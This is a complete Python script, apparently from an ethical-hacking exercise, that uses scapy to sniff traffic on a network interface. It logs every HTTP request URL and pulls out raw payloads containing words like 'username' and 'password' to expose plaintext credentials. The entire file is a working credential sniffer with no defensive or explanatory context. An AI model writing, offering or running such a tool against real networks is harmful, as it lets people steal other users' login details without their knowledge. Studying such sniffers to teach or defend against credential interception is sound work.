#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff packets on.")

    options = parser.parse_args()
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        load = load.replace(bytes("HTTP/1.1", "utf-8"), bytes("HTTP/1.0", "utf-8"))
        keywords = ["username", "login", "user", "password", "pass", "admin", "name", "id"]
        for keyword in keywords:
            if bytes(keyword, 'utf-8') in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request  >> " + str(url))
        login = get_login_info(packet)
        if login:
            print("\n\n[+] Possible username and passwords >> " + str(login) + "\n\n")


options = get_arguments()
sniff(options.interface)
